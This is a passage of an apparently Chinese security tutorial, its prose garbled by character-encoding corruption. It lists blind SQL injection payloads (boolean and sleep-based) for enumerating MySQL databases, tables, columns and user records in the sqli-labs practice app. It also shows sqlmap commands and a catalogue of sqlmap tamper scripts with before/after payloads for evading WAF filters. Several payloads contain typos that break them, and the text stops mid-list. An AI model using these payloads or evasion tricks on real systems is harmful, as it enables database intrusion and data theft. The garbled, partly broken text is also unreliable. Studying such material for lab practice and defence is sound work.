<p>æŸ¥è¯¢æŸä¸€ä¸ªæ•°æ®åº“åçš„é•¿åº¦</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; union (select length(schema_name) from information_schema.schemata limit 1,1) &lt; 77 --+</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>æŸ¥è¯¢æŸä¸ªæ•°æ®åº“å</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; union (select assii(substr(select schema_name from information_schema.schema limit 1,1)1,1)) &lt; 77 --+</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h5 id="æ•°æ®è¡¨ç›¸å…³">æ•°æ®è¡¨ç›¸å…³</h5>
<ol>
<li>
<p>æŸ¥è¯¢è¡¨çš„ä¸ªæ•°</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; union (select count(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;) &lt; 77 --+</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>æŸ¥è¯¢è¡¨çš„é•¿åº¦</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; union (select length(table_name) from information.schema.tables where table_schema&#x3D;&#39;security&#39;) &lt; 77 --+</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>æŸ¥çœ‹æŸä¸ªè¡¨å</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; union (select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 1,1),1,1))) &lt; 77 --+</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h5 id="å­—æ®µç›¸å…³">å­—æ®µç›¸å…³</h5>
<ol>
<li>
<p>æŸ¥çœ‹æŸä¸ªè¡¨ä¸­çš„å­—æ®µä¸ªæ•°</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; union (select count(column_name) from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39;) &lt; 77 --+</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>æŸ¥çœ‹æŸä¸ªå­—æ®µåçš„é•¿åº¦</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; union (select length(column_name) from infomation_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; limit 1,1) &lt; 77 --+</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>æŸ¥çœ‹æŸä¸ªå­—æ®µå</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; union (select ascii(substr((select column_name from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; limit 1,1),1,1))) &lt; 77 --+</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h5 id="è®°å½•å†…å®¹ç›¸å…³">è®°å½•å†…å®¹ç›¸å…³</h5>
<ol>
<li>
<p>æŸ¥çœ‹è¡¨ä¸­è¡Œæ•°</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; union (select count(*) from security.users) &lt; 77 --+</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>æŸ¥çœ‹æŸä¸ªå­—æ®µå†…å®¹çš„é•¿åº¦</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; union (select length(username) from security.users limit 1,1) &lt; 77 --+</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>æŸ¥çœ‹æŸä¸ªå­—æ®µçš„å†…å®¹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; union (select ascii(substr((select username from security.users limit 1,1),1,1))) &lt; 77 --+</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="æ—¶é—´ç›²æ³¨">æ—¶é—´ç›²æ³¨</h3>
<h4 id="ä½¿ç”¨åœºæ™¯-v4">ä½¿ç”¨åœºæ™¯</h4>
<p>é¡µé¢ä¸Šæ²¡æœ‰æ˜¾ç¤ºä½ï¼Œä¹Ÿæ²¡æœ‰è¾“å‡ºSQLè¯­å¥æ‰§è¡Œé”™è¯¯ä¿¡æ¯ã€‚æ­£ç¡®çš„SQLè¯­å¥å’Œé”™è¯¯çš„SQLè¯­å¥è¿”å›é¡µé¢éƒ½ä¸€æ ·ï¼Œä½†æ˜¯åŠ å…¥sleep(5)æ¡ä»¶ä¹‹åï¼Œå¦‚æœifæ¡ä»¶æˆç«‹åˆ™é¡µé¢çš„è¿”å›é€Ÿåº¦æ˜æ˜¾æ…¢äº†5ç§’ã€‚</p>
<h4 id="Payload-v4">Payload</h4>
<blockquote>
<p>ä¸å¸ƒå°”ç›²æ³¨çš„æ€æƒ³ç±»ä¼¼</p>
</blockquote>
<ol>
<li>
<p>åˆ¤æ–­æ•°æ®åº“çš„ä¸ªæ•°</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1&#39; and if((select count(schema_name) from information_schema.schemata)&#x3D;9, sleep(5), 1) --+</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>åˆ¤æ–­æ•°æ®åº“åçš„é•¿åº¦</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1&#39; and if((select length(schema_name) from information_schema.schemata)&#x3D;9, sleep(5), 1) --+</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>æŸ¥è¯¢æ•°æ®åº“å</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1&#39; and if((select ascii(substr((select schema_name from information_schema.schemata limit 0,1)1,1)))&#x3D;105, sleep(5), 1) --+</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="0x02-SQLMap-Payload">0x02 SQLMap Payload</h2>
<ol>
<li>
<p>ä»¥sqlilabä¸­çš„Less-8ä¸ºä¾‹ï¼ˆå¸ƒå°”å‹å•å¼•å·GETç›²æ³¨ï¼‰ï¼ŒæŸ¥çœ‹sqlmapä¸­ä½¿ç”¨çš„payloadsï¼Œæ‰§è¡Œå‘½ä»¤ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -v 3 -u &quot;http://localhost/sqlilabs/Less-8/?id=1&quot; --dbs --dbms=&quot;MySQL&quot;</span><br></pre></td></tr></table></figure>
<p>é¦–å…ˆè·å–æ•°æ®åº“çš„ä¸ªæ•°ï¼š<img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g7y2vi5zukj2141042gn9.jpg" alt="">å‡½æ•°è§£é‡Šï¼š</p>
<ul>
<li>
<p>ORD(string) ï¼šè¿”å›å­—ç¬¦ä¸²é¦–å­—ç¬¦çš„ASCIIç å€¼ã€‚</p>
</li>
<li>
<p>MID(stringï¼Œstartï¼Œlength) ï¼šè¿”å›å­—ç¬¦ä¸²çš„ä»startå¼€å§‹é•¿åº¦ä¸ºlengthçš„å­—ç¬¦ä¸²ã€‚</p>
</li>
<li>
<p>IFNULL(string1ï¼Œstring2) ï¼šå¦‚æœstring1æ˜¯NULLåˆ™è¿”å›string2ï¼Œå¦‚æœä¸æ˜¯NULLè¿”å›string1ã€‚</p>
</li>
<li>
<p>CAST(volume as type) ç”¨äºæ•°æ®ç±»å‹è½¬æ¢ï¼Œå°†volumeè½¬æ¢æˆtypeç±»å‹çš„æ•°æ®ï¼ˆå¦‚è¿™é‡Œæ˜¯å°†æ•°å­—è½¬<br>
æ¢ä¸ºå­—ç¬¦ä¸²ï¼‰ã€‚</p>
</li>
<li>
<p>COUNT()ï¼š ç»Ÿè®¡ä¸ªæ•°ã€‚</p>
</li>
<li>
<p>DISTINCT()ï¼š æ ‡è®°åªè¦ä¸åŒï¼ˆå”¯ä¸€ï¼‰çš„å€¼ã€‚</p>
</li>
</ul>
<p>Payloadè§£é‡Šï¼š</p>
<p>0-9çš„å­—ç¬¦ASCIIå€¼å¯¹åº”çš„æ˜¯48-57ï¼Œæ‰€ä»¥sqlmapé¦–å…ˆåˆ¤æ–­çš„&gt;51ä¹Ÿå°±æ˜¯&gt;3ï¼Œå› ä¸ºmysqlæœ¬èº«å°±æœ‰å…­ä¸ªæ•°æ®åº“ä½†worldã€testã€sakilaè¿™ä¸‰ä¸ªæ•°æ®åº“æ²¡ä»€ä¹ˆç”¨å¯ä»¥åˆ é™¤ï¼Œé‚£ä¹ˆæœ€å°‘åº”è¯¥æœ‰ä¸‰ä¸ªæ•°æ®åº“ï¼Œ<code>performance_schema</code>å’Œ<code>information_schema</code>å’Œ<code>mysql</code>ã€‚</p>
<p>å‡å¦‚æ•°æ®åº“çš„æ•°é‡æ˜¯&gt;3çš„è¯ï¼Œé‚£ä¹ˆå°±ç›¸å½“äº<code>1' and true</code>è¿”å›é¡µé¢ä¸ä¼šå‡ºç°é—®é¢˜ï¼Œå¦‚æœè¿”å›é¡µé¢ä¸æ˜¯æ­£ç¡®é¡µé¢çš„è¯æˆ‘ä»¬å°±å¯ä»¥ç¡®å®šä¸€å…±æœ‰ä¸‰ä¸ªæ•°æ®åº“ï¼ˆéƒ½æ˜¯é»˜è®¤çš„ï¼‰æˆ–è€…æ˜¯ç”±10å¤šä¸ªæ•°æ®åº“ï¼ˆ20å¤šä¸ªä¹Ÿæ˜¯æœ‰å¯èƒ½çš„ï¼‰ï¼Œåä½æ˜¯1,2æ€»ä¹‹æ˜¯å°äºç­‰äº3çš„ã€‚</p>
<p>å†è·å–æ¯ä¸ªæ•°æ®åº“åï¼ˆè¿™é‡Œä¹Ÿ<code>mysql</code>ä¸ºä¾‹ï¼‰ï¼š</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200gy1g7ymze766qj214q0hm11n.jpg" alt="">å…¶å®é“ç†å’Œä¸Šè¿°çš„ä¸€æ ·è¿›è¡ŒçŒœè§£ï¼Œé€šè¿‡åˆ¤æ–­æ¯ä¸€ä½çš„ASCIIç å€¼æ¥ç¡®å®šæ¯ä¸ªå­—æ¯ã€‚</p>
</li>
<li>
<p>å†ä»¥sqlilabä¸­çš„Less-4ä¸ºä¾‹ï¼ˆåŸºäºé”™è¯¯çš„GETåŒå¼•å·å­—ç¬¦å‹æ³¨å…¥ï¼‰ï¼ŒæŸ¥çœ‹sqlmapä¸­ä½¿ç”¨çš„payloadsï¼Œæ‰§è¡Œå‘½ä»¤ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -v 3 -u &quot;http://localhost/sqlilabs/Less-4/?id=1&quot; --level 4 --dbs --dbms=&quot;MySQL&quot;</span><br></pre></td></tr></table></figure>
<p>SQLMapæ‰§è¡Œçš„payloadå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200gy1g7yniit87tj21f40flq8z.jpg" alt=""></p>
</li>
</ol>
<h2 id="0x03-SQLMap-Tamper">0x03 SQLMap Tamper</h2>
<p>SQLMapçš„tamperä½¿ç”¨å‘½ä»¤å¦‚ä¸‹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sql -u [url] --tamper  [æ¨¡å—å]</span><br></pre></td></tr></table></figure>
<h3 id="å¸¸ç”¨çš„tamperè„šæœ¬">å¸¸ç”¨çš„tamperè„šæœ¬</h3>
<ol>
<li>
<p><a href="http://apostrophemask.py">apostrophemask.py</a><br>
é€‚ç”¨æ•°æ®åº“ï¼šALL<br>
ä½œç”¨ï¼šå°†å¼•å·æ›¿æ¢ä¸ºutf-8ï¼Œç”¨äºè¿‡æ»¤å•å¼•å·<br>
ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€œ1 AND â€˜1â€™='1â€)<br>
ä½¿ç”¨è„šæœ¬åï¼š1 AND %EF%BC%871%EF%BC%87=%EF%BC%871</p>
</li>
<li>
<p><a href="http://base64encode.py">base64encode.py</a><br>
é€‚ç”¨æ•°æ®åº“ï¼šALL<br>
ä½œç”¨ï¼šæ›¿æ¢ä¸ºbase64ç¼–ç <br>
ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€œ1â€™ AND SLEEP(5)#â€)<br>
ä½¿ç”¨è„šæœ¬åï¼šMScgQU5EIFNMRUVQKDUpIw==</p>
</li>
<li>
<p><a href="http://multiplespaces.py">multiplespaces.py</a><br>
é€‚ç”¨æ•°æ®åº“ï¼šALL<br>
ä½œç”¨ï¼šå›´ç»•sqlå…³é”®å­—æ·»åŠ å¤šä¸ªç©ºæ ¼<br>
ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 UNION SELECT foobarâ€™)<br>
ä½¿ç”¨è„šæœ¬åï¼š1 UNION SELECT foobar</p>
</li>
<li>
<p><a href="http://space2plus.py">space2plus.py</a><br>
é€‚ç”¨æ•°æ®åº“ï¼šALL<br>
ä½œç”¨ï¼šç”¨åŠ å·æ›¿æ¢ç©ºæ ¼<br>
ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT id FROM usersâ€™)<br>
ä½¿ç”¨è„šæœ¬åï¼šSELECT+id+FROM+users</p>
</li>
<li>
<p><a href="http://nonrecursivereplacement.py">nonrecursivereplacement.py</a><br>
é€‚ç”¨æ•°æ®åº“ï¼šALL<br>
ä½œç”¨ï¼šä½œä¸ºåŒé‡æŸ¥è¯¢è¯­å¥ï¼Œç”¨åŒé‡è¯­å¥æ›¿ä»£é¢„å®šä¹‰çš„sqlå…³é”®å­—ï¼ˆé€‚ç”¨äºéå¸¸å¼±çš„è‡ªå®šä¹‰è¿‡æ»¤å™¨ï¼Œä¾‹å¦‚å°†<br>
selectæ›¿æ¢ä¸ºç©ºï¼‰<br>
ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 UNION SELECT 2â€“â€™)<br>
ä½¿ç”¨è„šæœ¬åï¼š1 UNIOUNIONN SELESELECTCT 2â€“</p>
</li>
<li>
<p><a href="http://space2randomblank.py">space2randomblank.py</a><br>
é€‚ç”¨æ•°æ®åº“ï¼šALL<br>
ä½œç”¨ï¼šå°†ç©ºæ ¼æ›¿æ¢ä¸ºå…¶ä»–æœ‰æ•ˆå­—ç¬¦<br>
ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT id FROM usersâ€™)<br>
ä½¿ç”¨è„šæœ¬åï¼šSELECT%0Did%0DFROM%0Ausers</p>
</li>
<li>
<p><a href="http://unionalltounion.py">unionalltounion.py</a><br>
é€‚ç”¨æ•°æ®åº“ï¼šALL<br>
ä½œç”¨ï¼šå°†union allselect æ›¿æ¢ä¸ºunionselect<br>
ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€™-1 UNION ALL SELECTâ€™)<br>
ä½¿ç”¨è„šæœ¬åï¼š-1 UNION SELECT</p>
</li>
<li>
<p><a href="http://securesphere.py">securesphere.py</a><br>
é€‚ç”¨æ•°æ®åº“ï¼šALL<br>
ä½œç”¨ï¼šè¿½åŠ ç‰¹å®šçš„å­—ç¬¦ä¸²<br>
ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 AND 1=1â€™)<br>
ä½¿ç”¨è„šæœ¬åï¼š1 AND 1=1 and â€˜0havingâ€™=â€˜0havingâ€™</p>
</li>
<li>
<p><a href="http://space2dash.py">space2dash.py</a><br>
é€‚ç”¨æ•°æ®åº“ï¼šALL<br>
ä½œç”¨ï¼šå°†ç©ºæ ¼æ›¿æ¢ä¸ºâ€“ï¼Œå¹¶æ·»åŠ ä¸€ä¸ªéšæœºå­—ç¬¦ä¸²å’Œæ¢è¡Œç¬¦<br>
ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 AND 9227=9227â€™)<br>
ä½¿ç”¨è„šæœ¬åï¼š1â€“nVNaVoPYeva%0AANDâ€“ngNvzqu%0A9227=9227</p>
</li>
<li>
<p><a href="http://space2mssqlblank.py">space2mssqlblank.py</a><br>
é€‚ç”¨æ•°æ®åº“ï¼šMicrosoft SQL Server<br>
æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2000ã€Microsoft SQL Server 2005<br>
ä½œç”¨ï¼šå°†ç©ºæ ¼éšæœºæ›¿æ¢ä¸ºå…¶ä»–ç©ºæ ¼ç¬¦å·(â€™%01â€™, â€˜%02â€™, â€˜%03â€™, â€˜%04â€™, â€˜%05â€™, â€˜%06â€™, â€˜%07â€™,<br>
â€˜%08â€™, â€˜%09â€™, â€˜%0Bâ€™, â€˜%0Câ€™, â€˜%0Dâ€™, â€˜%0Eâ€™, â€˜%0Fâ€™, â€˜%0Aâ€™)<br>
ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT id FROM usersâ€™)<br>
ä½¿ç”¨è„šæœ¬åï¼šSELECT%0Eid%0DFROM%07users</p>
</li>
<li>
<p><a href="http://percentage.py">percentage.py</a><br>
é€‚ç”¨æ•°æ®åº“ï¼šASP<br>
æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2000, 2005ã€MySQL 5.1.56, 5.5.11ã€PostgreSQL<br>
9.0<br>
ä½œç”¨ï¼šåœ¨æ¯ä¸ªå­—ç¬¦å‰æ·»åŠ ä¸€ä¸ª%<br>
ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT FIELD FROM TABLEâ€™)<br>
ä½¿ç”¨è„šæœ¬åï¼š%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</p>
</li>
<li>
<p>sp_password.py<br>
é€‚ç”¨æ•°æ®åº“ï¼šMSSQL<br>
ä½œç”¨ï¼šä»T-SQLæ—¥å¿—çš„è‡ªåŠ¨è¿·ç³Šå¤„ç†çš„æœ‰æ•ˆè½½è·ä¸­è¿½åŠ sp_password<br>
ä½¿ç”¨è„šæœ¬å‰ï¼štamper('1 AND 9227=9227-- ')<br>
ä½¿ç”¨è„šæœ¬åï¼š1 AND 9227=9227-- sp_password</p>
</li>
<li>
<p><a href="http://charencode.py">charencode.py</a><br>
æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2005ã€MySQL 4, 5.0 and 5.5ã€Oracle 10gã€<br>
PostgreSQL 8.3, 8.4, 9.0<br>
ä½œç”¨ï¼šå¯¹ç»™å®šçš„payloadå…¨éƒ¨å­—ç¬¦ä½¿ç”¨urlç¼–ç ï¼ˆä¸å¤„ç†å·²ç»ç¼–ç çš„å­—ç¬¦ï¼‰<br>
ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT FIELD FROM%20TABLEâ€™)<br>
ä½¿ç”¨è„šæœ¬åï¼š%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45</p>
</li>
<li>
<p><a href="http://randomcase.py">randomcase.py</a><br>
æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2005ã€MySQL 4, 5.0 and 5.5ã€Oracle 10gã€<br>
PostgreSQL 8.3, 8.4, 9.0<br>
ä½œç”¨ï¼šéšæœºå¤§å°å†™<br>
ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜INSERTâ€™)<br>
ä½¿ç”¨è„šæœ¬åï¼šINseRt</p>
</li>
<li>
<p><a href="http://charunicodeencode.py">charunicodeencode.py</a><br>
é€‚ç”¨æ•°æ®åº“ï¼šASPã€<a href="http://ASP.NET">ASP.NET</a><br>
æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2000/2005ã€MySQL 5.1.56ã€PostgreSQL 9.0.3<br>
ä½œç”¨ï¼šé€‚ç”¨å­—ç¬¦ä¸²çš„unicodeç¼–ç <br>
ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT FIELD%20FROM TABLEâ€™)<br>
ä½¿ç”¨è„šæœ¬åï¼š<br>
%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u<br>
0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045</p>
</li>
<li>
<p><a href="http://space2comment.py">space2comment.py</a><br>
æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2005ã€MySQL 4, 5.0 and 5.5ã€Oracle 10gã€PostgreSQL 8.3, 8.4, 9.0<br>
ä½œç”¨ï¼šå°†ç©ºæ ¼æ›¿æ¢ä¸º/**/<br>
ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT id FROM usersâ€™)<br>
ä½¿ç”¨è„šæœ¬åï¼šSELECT/**/id/**/FROM/**/users</p>
</li>
<li>
<p><a href="http://equaltolike.py">equaltolike.py</a><br>
æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2005ã€MySQL 4, 5.0 and 5.5<br>
ä½œç”¨ï¼šå°†=æ›¿æ¢ä¸ºLIKE<br>
ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT * FROM users WHERE id=1â€™)<br>
ä½¿ç”¨è„šæœ¬åï¼šSELECT * FROM users WHERE id LIKE 1</p>
</li>
<li>
<p><a href="http://equaltolike.py">equaltolike.py</a><br>
æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 4, 5.0 and 5.5ã€Oracle 10gã€PostgreSQL 8.3, 8.4, 9.0<br>
ä½œç”¨ï¼šå°†&gt;æ›¿æ¢ä¸ºGREATESTï¼Œç»•è¿‡å¯¹&gt;çš„è¿‡æ»¤<br>
ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 AND A &gt; Bâ€™)<br>
ä½¿ç”¨è„šæœ¬åï¼š1 AND GREATEST(A,B+1)=A</p>
</li>
<li>
<p><a href="http://ifnull2ifisnull.py">ifnull2ifisnull.py</a><br>
é€‚ç”¨æ•°æ®åº“ï¼šMySQLã€SQLite (possibly)ã€SAP MaxDB (possibly)<br>
æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 5.0 and 5.5<br>
ä½œç”¨ï¼šå°†ç±»ä¼¼äºIFNULL(A, B)æ›¿æ¢ä¸ºIF(ISNULL(A), B, A)ï¼Œç»•è¿‡å¯¹IFNULLçš„è¿‡æ»¤<br>
ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜IFNULL(1, 2)â€™)<br>
ä½¿ç”¨è„šæœ¬åï¼šIF(ISNULL(1),2,1)</p>
</li>
<li>
<p><a href="http://modsecurityversioned.py">modsecurityversioned.py</a><br>
é€‚ç”¨æ•°æ®åº“ï¼šMySQL<br>
æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 5.0<br>
ä½œç”¨ï¼šè¿‡æ»¤ç©ºæ ¼ï¼Œä½¿ç”¨mysqlå†…è”æ³¨é‡Šçš„æ–¹å¼è¿›è¡Œæ³¨å…¥<br>
ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 AND 2&gt;1â€“â€™)<br>
ä½¿ç”¨è„šæœ¬åï¼š1 /<em>!30874AND 2&gt;1</em>/â€“</p>
</li>
<li>
<p><a href="http://space2mysqlblank.py">space2mysqlblank.py</a><br>
é€‚ç”¨æ•°æ®åº“ï¼šMySQL<br>
æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 5.1<br>
ä½œç”¨ï¼šå°†ç©ºæ ¼æ›¿æ¢ä¸ºå…¶ä»–ç©ºæ ¼ç¬¦å·(â€™%09â€™, â€˜%0Aâ€™, â€˜%0Câ€™, â€˜%0Dâ€™, â€˜%0Bâ€™)<br>
ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT id FROM usersâ€™)<br>
ä½¿ç”¨è„šæœ¬åï¼šSELECT%0Bid%0DFROM%0Cusers</p>
</li>
<li>
<p><a href="http://modsecurityzeroversioned.py">modsecurityzeroversioned.py</a><br>
é€‚ç”¨æ•°æ®åº“ï¼šMySQL<br>
æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 5.0<br>
ä½œç”¨ï¼šä½¿ç”¨å†…è”æ³¨é‡Šæ–¹å¼ï¼ˆ/<em>!00000</em>/ï¼‰è¿›è¡Œæ³¨å…¥<br>
ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 AND 2&gt;1â€“â€™)<br>
ä½¿ç”¨è„šæœ¬åï¼š1 /<em>!00000AND 2&gt;1</em>/â€“</p>
</li>
<li>
<p><a href="http://space2mysqldash.py">space2mysqldash.py</a><br>
é€‚ç”¨æ•°æ®åº“ï¼šMySQLã€MSSQL<br>
ä½œç”¨ï¼šå°†ç©ºæ ¼æ›¿æ¢ä¸º â€“ ï¼Œå¹¶è¿½éšä¸€ä¸ªæ¢è¡Œç¬¦<br>
ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 AND 9227=9227â€™)<br>
ä½¿ç”¨è„šæœ¬åï¼š1â€“%0AANDâ€“%0A9227=9227</p>
</li>
<li>
<p><a href="http://bluecoat.py">bluecoat.py</a><br>
é€‚ç”¨æ•°æ®åº“ï¼šBlue Coat SGOS<br>
æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 5.1,ã€SGOS<br>
ä½œç”¨ï¼šåœ¨sqlè¯­å¥ä¹‹åç”¨æœ‰æ•ˆçš„éšæœºç©ºç™½å­—ç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦ï¼Œéšåç”¨LIKEæ›¿æ¢=<br>
ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT id FROM users where id = 1â€™)<br>
ä½¿ç”¨è„šæœ¬åï¼šSELECT%09id FROM users where id LIKE 1</p>
</li>
<li>
<p><a href="http://versionedkeywords.py">versionedkeywords.py</a><br>
é€‚ç”¨æ•°æ®åº“ï¼šMySQL<br>
æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 4.0.18, 5.1.56, 5.5.11<br>
ä½œç”¨ï¼šæ³¨é‡Šç»•è¿‡<br>
ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 UNION ALL SELECT NULL, NULL,<br>
CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS<br>
CHAR),CHAR(32)),CHAR(58,100,114,117,58))#â€™)<br>
ä½¿ç”¨è„šæœ¬åï¼š1/<em>!UNION</em>//<em>!ALL</em>//<em>!SELECT</em>//<em>!NULL</em>/,/<em>!NULL</em>/,<br>
CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/<em>!AS</em>//<em>!CHAR</em>/),CHAR(<br>
32)),CHAR(58,100,114,117,58))#</p>
</li>
<li>
<p><a href="http://halfversionedmorekeywords.py">halfversionedmorekeywords.py</a><br>
é€‚ç”¨æ•°æ®åº“ï¼šMySQL &lt; 5.1<br>
æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 4.0.18/5.0.22<br>
ä½œç”¨ï¼šåœ¨æ¯ä¸ªå…³é”®å­—å‰æ·»åŠ mysqlç‰ˆæœ¬æ³¨é‡Š<br>
ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€œvalueâ€™ UNION ALL SELECT<br>
CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS<br>
CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND â€˜QDWaâ€™='QDWaâ€)<br>
ä½¿ç”¨è„šæœ¬åï¼š<br>
valueâ€™/<em>!0UNION/</em>!0ALL/<em>!0SELECT/</em>!0CONCAT(/<em>!0CHAR(58,107,112,113,58),/</em>!0IFNUL<br>
L(CAST(/<em>!0CURRENT_USER()/</em>!0AS/<em>!0CHAR),/</em>!0CHAR(32)),/<em>!0CHAR(58,97,110,121,58<br>
)),/</em>!0NULL,/<em>!0NULL#/</em>!0AND â€˜QDWaâ€™='QDWa</p>
</li>
<li>
<p><a href="http://space2morehash.py">space2morehash.py</a><br>
é€‚ç”¨æ•°æ®åº“ï¼šMySQL &gt;= 5.1.13<br>
æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 5.1.41<br>
ä½œç”¨ï¼šå°†ç©ºæ ¼æ›¿æ¢ä¸º#ï¼Œå¹¶æ·»åŠ ä¸€ä¸ªéšæœºå­—ç¬¦ä¸²å’Œæ¢è¡Œç¬¦<br>
ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 AND 9227=9227â€™)<br>
ä½¿ç”¨è„šæœ¬åï¼š1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227</p>
</li>
<li>
<p><a href="http://apostrophenullencode.py">apostrophenullencode.py</a><br>
é€‚ç”¨æ•°æ®åº“ï¼šALL<br>
ä½œç”¨ï¼šç”¨éæ³•åŒå­—èŠ‚Unicodeå­—ç¬¦æ›¿æ¢å•å¼•å·<br>
ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€œ1 AND â€˜1â€™='1â€)<br>
ä½¿ç”¨è„šæœ¬åï¼š1 AND %00%271%00%27=%00%271</p>
</li>
<li>
<p><a href="http://appendnullbyte.py">appendnullbyte.py</a><br>
é€‚ç”¨æ•°æ®åº“ï¼šALL<br>
ä½œç”¨ï¼šåœ¨æœ‰æ•ˆè½½è·çš„ç»“æŸä½ç½®åŠ è½½nullå­—èŠ‚å­—ç¬¦ç¼–ç <br>
ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 AND 1=1â€™)<br>
ä½¿ç”¨è„šæœ¬åï¼š1 AND 1=1%00</p>
</li>
<li>
<p><a href="http://chardoubleencode.py">chardoubleencode.py</a><br>
é€‚ç”¨æ•°æ®åº“ï¼šALL<br>
